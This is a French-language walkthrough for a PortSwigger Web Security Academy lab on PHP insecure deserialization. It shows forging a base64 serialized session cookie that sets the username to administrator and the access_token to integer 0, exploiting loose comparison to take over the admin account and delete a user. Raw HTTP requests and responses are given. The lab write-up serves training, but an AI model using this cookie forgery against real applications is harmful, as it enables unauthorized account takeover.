# Lab

https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types

## Solution

Quand on se connecter avec le compte `wiener:peter`, on obtient un cookie de session : `Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJqajFhNmxuanNpNWNoNWxic3VlY21rNmVwZmkwcDhrZiI7fQ%3d%3d`

La chaine de caractères est encodée en base64, on peut la décoder :

```bash
$ echo "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJqajFhNmxuanNpNWNoNWxic3VlY21rNmVwZmkwcDhrZiI7fQ==" | base64 -d
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"jj1a6lnjsi5ch5lbsuecmk6epfi0p8kf";}
```

Si on modifie la valeur de l'username pour accéder au compte `administrator` on a cette erreur :

```bash
$ echo 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:32:"jj1a6lnjsi5ch5lbsuecmk6epfi0p8kf";}' | base64
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImpqMWE2bG5qc2k1Y2g1bGJzdWVjbWs2ZXBmaTBwOGtmIjt9Cg==
```

```http
GET /my-account?id=wiener HTTP/2
Host: 0a3f003d044ba06283a6854a002700ee.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImpqMWE2bG5qc2k1Y2g1bGJzdWVjbWs2ZXBmaTBwOGtmIjt9Cg%3d%3d
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0a3f003d044ba06283a6854a002700ee.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```

```http
<div class="container is-page">
    <header class="navigation-header">
    </header>
    <h4>Internal Server Error</h4>
        <p class=is-warning>PHP Fatal error:  Uncaught Exception: (DEBUG: $access_tokens[$user-&gt;username] = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx, $user-&gt;access_token = jj1a6lnjsi5ch5lbsuecmk6epfi0p8kf, $access_tokens = [xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx]) Invalid access token for user administrator in /var/www/index.php:8
        Stack trace:
        #0 {main}
            thrown in /var/www/index.php on line 8
    </p>
</div>
```

L'erreur nous indique que l'access token est invalide pour l'utilisateur `administrator`.

On peut faire une supposition et penser que le contrôle de l'access token se fait en PHP via loose comparison `==` au lieu de strict comparison `===`, par exemple :

```php
if ($user->access_token == $access_tokens[$user->username]) {
    // ...
}
```

Dans ce cas, si on remplace le `access_token` par le chiffre `0` on devrait pouvoir accéder au compte `administrator`.

```bash
$ echo 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}' | base64
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9Cg==
```

```http
GET /my-account?id=administrator HTTP/2
Host: 0a3f003d044ba06283a6854a002700ee.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9Cg%3d%3d
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0a3f003d044ba06283a6854a002700ee.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```

La requête passe et nous donne accès au compte administrateur, on peut maintenant supprimer le compte de Carlos.

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a3f003d044ba06283a6854a002700ee.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9Cg%3d%3d
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0a3f003d044ba06283a6854a002700ee.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```